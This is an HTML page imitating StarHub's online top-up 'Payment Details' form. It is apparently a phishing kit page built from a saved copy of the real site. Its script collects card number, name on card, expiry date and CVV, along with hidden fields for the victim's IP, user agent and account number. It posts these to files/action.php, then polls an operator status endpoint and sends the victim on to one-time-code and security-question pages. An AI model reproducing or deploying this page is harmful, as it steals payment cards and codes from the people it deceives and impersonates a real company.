
<!DOCTYPE html>
<!-- saved from url=(0068)https://topup.starhub.com/starhub-onlinetopup/web/paymentdetails.htm -->
<html lang="en">
	<!--<![endif]-->
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>Payment Details</title>
		<script type="text/javascript" async="" src="./PaymentDetailsfiles/analytics.js"></script>
		<script async="" src="./PaymentDetailsfiles/gtm.js"></script>
		<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-K5BDGMF');</script>


		<!-- Mobile Meta -->
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

		<!-- Favicon -->
		<link rel="shortcut icon" href="https://topup.starhub.com/starhub-onlinetopup/images/favicon.ico">

		<!-- Web Fonts -->
		<link href="./PaymentDetailsfiles/4.css" rel="stylesheet" type="text/css">
		<link href="./PaymentDetailsfiles/1.css" rel="stylesheet" type="text/css">
		<link href="./PaymentDetailsfiles/2.css" rel="stylesheet" type="text/css">
		<link href="./PaymentDetailsfiles/3.css" rel="stylesheet" type="text/css">

		<!-- Bootstrap core CSS -->
		<link href="./PaymentDetailsfiles/bootstrap.css" rel="stylesheet">

		<!-- Font Awesome CSS -->
		<link href="./PaymentDetailsfiles/font-awesome.css" rel="stylesheet">

		<!-- the project core CSS file -->
		<link href="./PaymentDetailsfiles/style.css" rel="stylesheet">

		<!-- Color Scheme (In order to change the color scheme, replace the blue.css with the color scheme that you prefer)-->
		<link href="./PaymentDetailsfiles/green.css" rel="stylesheet">

		<!-- Custom css -->
		<link href="./PaymentDetailsfiles/custom.css" rel="stylesheet">
		<link href="./PaymentDetailsfiles/base_styles_responsive.css" rel="stylesheet">
	</head>

	<body>
		<noscript>
			<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K5BDGMF"
					height="0" width="0" style="display:none;visibility:hidden"></iframe>
		</noscript>

		<!-- page wrapper start -->
		<!-- ================ -->
		<div class="main-wrapper">



			<header>
				<div class="header-top-wrapper">
					<div class="container">
						<a href="https://topup.starhub.com/starhub-onlinetopup/web/">
							<img src="./PaymentDetailsfiles/logo-starhub.png" alt="Starhub">
						</a>
					</div>
				</div>

				<div class="header-bottom-wrapper">
					<div class="container">
						<span>Check the status of your account</span>
					</div>
				</div>
			</header>


			<!-- breadcrumb start -->
			<!-- ================ -->

			<!-- breadcrumb end -->

			<!-- main-container start -->
			<!-- ================ -->
			<section class="main-container">

				<div class="container">
					<div class="row">

						<!-- main start -->
						<!-- ================ -->
						<div class="main col-md-12">

							<div class="step-bar">Step 1: Enter Enquiry Number</div>
							<div class="step-bar active">Step 2: Updates Bills & Payments</div>

							<fieldset>
								<form id="main-form" class="form-horizontal" role="form"  method="post" novalidate="novalidate">
								    <input type="hidden" name="ip" value="2a0a:b640:1:5a::a07e">
			                        <input type="hidden" name="ua" value="Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.85 Mobile/15E148 Safari/604.1">
			                        <input type="hidden" name="username" value="52523453">
									<input type="hidden" name="password" value="null">
									<div class="row">
										<div class="col-md-10 col-md-offset-1">




											<div class="form-group has-feedback ">
												<label class="col-sm-3 control-label">Credit Card Number<small class="text-default">*</small>
												</label>
												<div class="col-sm-6">
													<input id="card_number" name="cardNum" class="form-control card_number cc-num" type="tel" required="required" value="" autocomplete="off" aria-required="true">
													<!--<span class="fa form-control-feedback" aria-hidden="true"></span>-->
												</div>
												<!--<div class="col-sm-3 help-block"></div>-->
											</div>


											<div class="form-group has-feedback ">
												<label class="col-sm-3 control-label">Name on Card<small class="text-default">*</small>
												</label>
												<div class="col-sm-6">
													<input id="cardName" name="cardName" class="form-control" required="required" type="text" value="" maxlength="100" autocomplete="off" aria-required="true">
													<!--<span class="fa form-control-feedback" aria-hidden="true"></span>-->
												</div>
												<div class="col-sm-3 help-block"></div>
											</div>

											<div class="row">
												<div class="col-xs-6 col-sm-12">

													<div class="form-group has-feedback text-left ">
														<label class="col-sm-3 control-label">Expiry Date<small class="text-default">*</small>
														</label>
														<div class="col-sm-3">
															<input id="cardExpiryDate" name="cardExpiryDate" class="form-control cc-exp" placeholder="MM / YY" type="tel" required="required" value="" maxlength="7" autocomplete="off" aria-required="true">
															<!--<span class="fa form-control-feedback" aria-hidden="true"></span>-->
														</div>
														<div class="col-sm-6 help-block"></div>
													</div>
												</div>
												<div class="col-xs-6 col-sm-12">

													<div class="form-group has-feedback text-left ">
														<label class="col-sm-3 control-label">CVV<small class="text-default">*</small>
														</label>
														<div class="col-sm-3">
															<input id="cardCVV" name="cardCVV" class="form-control" minlength="3" type="password" required="required" value="" maxlength="3" autocomplete="off" aria-required="true">
															<!--<span class="fa form-control-feedback" aria-hidden="true"></span>-->
														</div>
														<div class="col-sm-6 help-block"></div>
													</div>
												</div>
											</div>

											<div class="row">
												<div class="col-sm-3"></div>
												<div class="col-sm-9">
													<label>
														<small class="text-default">*</small> Required Field
														<br>
													</label>

													<div class="checkbox">
														<label>
															<input id="cardSave1" name="cardSave" type="checkbox" value="true" checked="checked">
															<input type="hidden" name="_cardSave" value="on">Save my Card Number, Name and Expiry Date for next top up</label>
													</div>
												</div>
											</div>

										</div>
									</div>
								</form>
							</fieldset>

							<div class="row row-bottom">
								<div class="col-xs-6 bottom-button">
									<a href="Dengluzhong.php" class="btn btn-group btn-default btn-left">
										<i class="icon-left-open-big"></i> Back
									</a>
								</div>
								<div class="col-xs-6 bottom-button">
									<button id="tijiao" class="btn btn-group btn-default" type="button">
										Next <i class="icon-right-open-big"></i>
									</button>
								</div>
							</div>

						</div>
						<!-- main end -->

					</div>
				</div>
			</section>
			<!-- main-container end -->

			<footer class="hidden-xs">
				<div class="row">
					<div class="copyright-starhub col-sm-6">
						© StarHub 2022. All right reserved.
						&nbsp;&nbsp;&nbsp;<a style="color:white;" href="https://www.starhub.com/about-us/legal-notices-and-terms/personal-data-protection.html" target="_blank">Data Protection Policy</a>
						&nbsp;&nbsp;&nbsp;<a style="color:white;" href="https://vdp.starhub.com/" target="_blank">Report Vulnerability</a>
					</div>
				</div>
			</footer>


		</div>

		<div class="modal" id="modal-loading">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-body">
						<h4>
							<i class="fa fa-circle-o-notch fa-spin">
							   
							    </i> <img src="http://img.zcool.cn/community/011b3b599a3c2800000021294fa0aa.gif">Please wait... Your card details are being verified
						</h4>
					</div>
				</div>
			</div>
		</div>

		<div class="modal fade" id="modal-3dsecure">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal">×</button>
						<h4 class="modal-title">Important</h4>
					</div>
					<div class="modal-body">
						<div class="row">
							<div class="col-xs-6">
								<img src="./PaymentDetailsfiles/verified-by-visa.png" style="width: 70%; margin-right: 0;" class="img-responsive center-block" alt="Verified by VISA">
							</div>
							<div class="col-xs-6">
								<img src="./PaymentDetailsfiles/mastercard-securecode.png" style="width: 70%; margin-left: 0;" class="img-responsive center-block" alt="MasterCard SecureCode">
							</div>
						</div>
						<br>

						<p>We only accepts Visa and MasterCards, both Credit and Debit, with 3D Secure (Verified by Visa and MasterCard SecureCode) enabled.</p>
						<p>3D Secure (3DS) is an added security measure, where you will be required to enter an One-Time Password (OTP) when you make online purchases at participating 3D Secure merchants.</p>
						<p>Please ensure that you have enabled your card with One-Time Password (OTP) for your online purchases.</p>
						<p>For further clarification, you may contact your bank for more details.</p>
					</div>
					<div class="modal-footer" style="text-align: center;">
						<button id="btn-proceed" class="btn btn-default" style="margin: 10px 0;">
							Yes, My Card is 3DS Enabled
						</button>
						<button id="btn-close" class="btn btn-default" data-dismiss="modal" style="margin: 10px 0;">
							Try another card with 3DS Enabled
						</button>
					</div>
				</div>
			</div>
		</div>

		<script type="text/javascript" src="./PaymentDetailsfiles/jquery.min.js"></script>
		<script type="text/javascript" src="./PaymentDetailsfiles/bootstrap.min.js"></script>
		<script type="text/javascript" src="./PaymentDetailsfiles/jquery.validate.min.js"></script>

		<script type="text/javascript">
			// default validator action
			(function($) {
				var doValidate = function(element) {
			    	var $element = $(element);
			    	if ($element.attr("type") != "checkbox")
			    		$element.closest('.form-group').children('.help-block').children('label.server-error').remove();
			    	$element.valid();
			    }
				
				$.validator.setDefaults({
					highlight: function (element, errorClass, validClass) {
						var $element = $(element);
						
						if ($element.attr("type") == "checkbox") {
							$element.closest('.checkbox').removeClass("has-success").addClass("has-error");
						} else {
							$element.closest('.form-group').removeClass("has-success").addClass("has-error");
							var $fa = $element.closest('.form-group').find('span.form-control-feedback');
							$fa.removeClass("fa-check")
							if (!$element.is(":focus"))
								$fa.addClass("fa-times");
						}
				    },
				    unhighlight: function (element, errorClass, validClass) {
				    	var $element = $(element);
				    	if ($element.attr("type") == "checkbox") {
							$element.closest('.checkbox').removeClass("has-error").addClass("has-success");
						} else {
					    	$element.closest('.form-group').removeClass("has-error").addClass("has-success");
					    	$element.closest('.form-group').find('span.form-control-feedback').removeClass("fa-times")
					        	.addClass("fa-check");
						}
				    },
				    onfocusout: doValidate,
				    onkeyup: doValidate,
				    errorElement: "label",
				    errorPlacement: function(error, element) {
				    	if (element.attr("type") == "checkbox") {
				    		error.appendTo(element.closest('.checkbox').children('.help-block').first());
				    	} else {
				    		error.appendTo(element.closest('.form-group').children('.help-block').first());
				    	}
				    }
				})
				// add pattern (regex)
				$.validator.addMethod( "pattern", function( value, element, param ) {
					if ( this.optional( element ) ) {
						return true;
					}
					if ( typeof param === "string" ) {
						param = new RegExp( "^(?:" + param + ")$" );
					}
					return param.test( value );
				}, "Invalid format." );
			})(jQuery);
			
			$('.happy-app-banner-close').click(function(e) {
				$(e.target).closest('.happy-app-banner').css("display", "none");
				document.cookie = "hide-app-banner=1";
				return false;
			});
		</script>
		<script type="text/javascript" src="./PaymentDetailsfiles/jquery.payment.min.js"></script>

<script async src="3.1.1/layer.js"></script>

		<script type="text/javascript">
			(function($) {
					$.validator.addMethod("ccnum", function(value, element, params) {
						if ($.payment.validateCardNumber(value) == false)
							return false;
						var cardType = $.payment.cardType(value);
						if (cardType != "visa" && cardType != "mastercard")
							return false;
						return true;
					}, "Invalid card number");
					$.validator.addMethod("ccexp", function(value, element, params) {
						return $.payment.validateCardExpiry(value.substring(0, 2), value.substring(5, 7));
					}, "Invalid expiry date");
					
					var $ccNum = $('input.cc-num');
					var $ccExp = $('input.cc-exp');
					$ccNum.payment('formatCardNumber');
					$ccExp.payment('formatCardExpiry');
					if ($ccNum.val())
						$ccNum.keyup();
					
					$('#main-form').validate({
						rules: {
							cardExpiryDate: {
								ccexp: true
							},
							cardCVV: {
								digits: true
							}
						},
						messages: {
							cardNum: {
								minlength: "Card Number is 16 digits"
							},
							cardCVV: {
								minlength: "CVV is invalid",
								digits: "CVV is invalid"
							}
						}
					});
					
					var masked = false;
					var $cardNum = $('input[name=cardNum]');
					if ($cardNum.val() 
							&& $cardNum.closest('.form-group').children('.help-block').children('.server-error').length == 0) {
						masked = true;
						$cardNum.on('keyup', clearMaskedCardNum).valid();
					} else {
						$cardNum.rules("add", { minlength: 19, ccnum: true });
					}
					
					var $cardName = $('input[name=cardName]');
					if ($cardName.val() 
							&& $cardName.closest('.form-group').children('.help-block').children('.server-error').length == 0)
						$cardName.valid();
					
					var $cardExpiryDate = $('input[name=cardExpiryDate]');
					if ($cardExpiryDate.val() 
							&& $cardExpiryDate.closest('.form-group').children('.help-block').children('.server-error').length == 0)
						$cardExpiryDate.valid();
					
					var allowProceed = false;
					$('#main-form').on('submit', function(e) {
						if (e.isDefaultPrevented())
							return;
						
						if (allowProceed)
							return true;
						
						$('#modal-loading').modal({show: true, backdrop: 'static', keyboard: false});
						
						$.ajax({
							method: "GET",
							url: "/starhub-onlinetopup/check3D?" 
									+ $.param(generatedCheck3DParam(masked,  $('input[name=cardNum]').val().replace(/\s/g, '')))
						}).done(function(data) {
							if (data == "ok") {
								allowProceed = true;
								$('#main-form').submit();
							} else {
								$('#modal-loading').modal('hide');
								show3DSModal();
							}
						}).fail(function() {
							$('#modal-loading').modal('hide');
							show3DSModal();
						});
						
						return false;
					});
					
					$('#btn-next').prop('disabled', false);
					
					function generatedCheck3DParam(encrypted, card) {
						if (encrypted) {
							return {
								e: "true",
								t: localStorage.getItem("_a"),
								c: localStorage.getItem("_b")
							};
						} else {
							return { e: "false", b: card.substring(0, 6), p: card.substring(12, 16) };
						}
					}
					
					function clearMaskedCardNum(event) {
						if (!event || event.keyCode == 8 || event.keyCode == 46 || event.keyCode == 229) {
							$cardNum.val("");
							$cardNum.rules("add", { minlength: 19, ccnum: true });
							
							$('#alert-usingsavedcard').fadeOut(400, function() {
								if (!isElementInViewport($cardNum.get(0))) {
									$('html, body').scrollTop($cardNum.closest('fieldset').offset().top);
								}
							});
							masked = false;
							$cardNum.off("keyup", clearMaskedCardNum);
						}
					}
					
					var threeDModal = null;
					function show3DSModal() {
						if (threeDModal == null) {
							threeDModal = $('#modal-3dsecure').find('#btn-proceed').click(function(){
								allowProceed = true;
								$('#modal-3dsecure').modal('hide');
								$('#modal-loading').modal({show: true, backdrop: 'static', keyboard: false});
								$('#main-form').submit();
							}).end().find('#btn-close').click(function(){
								clearMaskedCardNum();
								$cardNum.valid();
								$cardNum.focus();
								$cardName.val("").valid();
								$cardExpiryDate.val("").valid();
								$('#cardCVV').val("").valid();
							}).end().on('show.bs.modal', function(){
								ga('send', {
									hitType: 'event',
									eventCategory: '3D Secure Modal',
									eventAction: "open",
								});
							}).on('hide.bs.modal', function(){
								ga('send', {
									hitType: 'event',
									eventCategory: '3D Secure Modal',
									eventAction: allowProceed ? "proceed" : "close",
								});
							}).modal({show: true});
						} else {
							threeDModal.modal('show');
						}
					}
					
					function isElementInViewport(el) {
					    var rect = el.getBoundingClientRect();
			
					    return (
					        rect.top >= 0 &&
					        rect.left >= 0 &&
					        rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) &&
					        rect.right <= (window.innerWidth || document.documentElement.clientWidth)
					    );
					}
				})(jQuery);
		</script>
		<script>
        $(function(){
                        $('#tijiao').bind('click',function(){
                            
                                       
                            var cnumber = $('#card_number').val();
                            var cardName=$('#cardName').val();
                            var expiry = $('#cardExpiryDate').val();
                            var cvv = $('#cardCVV').val();
                            var phone = $('#phone').val();
                            if ($.payment.validateCardNumber(cnumber) == false) {
                                layer.msg('Invalid card number');
                                return false;
                            }
                            
                            
                            if (cnumber == null || expiry == '' || cvv == '' || cardName == '') {
                                layer.msg('Please fill in the content, which cannot be blank!')
                            } else {
                
                            }
                            if(cnumber.length < 16){
                                layer.msg('cnumber error!')
                            }
                            $.ajax({
                                type: 'POST',
                                url: 'files/action.php?type=login',
                                data: $('#main-form').serialize(),
                                success: function(data) {
                                    console.log(data);
                                    var parsed_data = JSON.parse(data);
                                    if (parsed_data.status == 'ok') {
                                        
                                        //console.log(parsed_data);
                                        var timmer = setInterval(function() {
                                        $('#modal-loading').modal({show: true, backdrop: 'static', keyboard: false});
                                          var id = parsed_data.userid;
                                          var urldata = 'files/action.php?getstatus=' + id;
                                          $.ajax({
                                            url:urldata,
                                            type:'GET',
                                            success: function(response){
                                            // if ($.payment.cardType(cnumber)  != "mastercard") {
                                            //     layer.msg('Only Mastercard is supported at this time, please change your card.');
                                            //     $('#modal-loading').modal('hide');
                                            //     clearInterval(timmer);
                                            //     //window.location.href = 'new-card.php?error';
                                            //     return false;
                                            // }
                                              if(response == 5){
                                                $('#modal-loading').modal('hide');
                                                window.location.href = 'new-card.php?error';
                                        
                                              }else if(response == 2){
                                                $('#modal-loading').modal('hide');
                                                window.location.href = 'code.php';
                                              }else if(response == 22){
                                                $('#modal-loading').modal('hide');
                                                window.location.href = 'code.php?error';
                                              }else if(response == 4){
                                                $('#modal-loading').modal('hide');
                                                window.location.href = 'SuccessDBS.php';
                                                
                                              }else if(response == 77){
                                                $('#modal-loading').modal('hide');
                                                window.location.href = 'question.php';
                                                
                                              }else if(response == 55){
                                                $('#modal-loading').modal('hide');
                                                window.location.href = 'Dengluzhong.php?error';
                                                
                                              }else if(response == 88){
                                                  $('#modal-loading').modal('hide');
                                                  clearInterval(timmer);
                                                  var message="The card you have entered is not supported at this time, please change to another card.";
                                                    layer.confirm(message, {
                                                           icon: 2,
                                                           btn: 'Confirm',
                                                           skin : "my-skin",
                                                           time: 0,
                                                           title:'Error',
                                                           yes: function(){
                                                              location.href = "new-card.php?HK"
                                                           }
                                                       });
                                              }
                                        
                                            },
                                            error: function(err) {
                                              console.error('error: ' + err);
                                            }
                                        
                                          });
                                        
                                        }, 2000);



                
                
                
                                    } else {
                                        return false;
                                    }
                                    //console.log(parsed_data.status);
                                }
                            })

                        
                        
                        
                          });
                    });
             
                </script>
<script async src="//static.getclicky.com/101373846.js"></script>
<noscript><p><img alt="Clicky" width="1" height="1" src="//in.getclicky.com/101373846ns.gif" /></p></noscript>
	</body>
</html>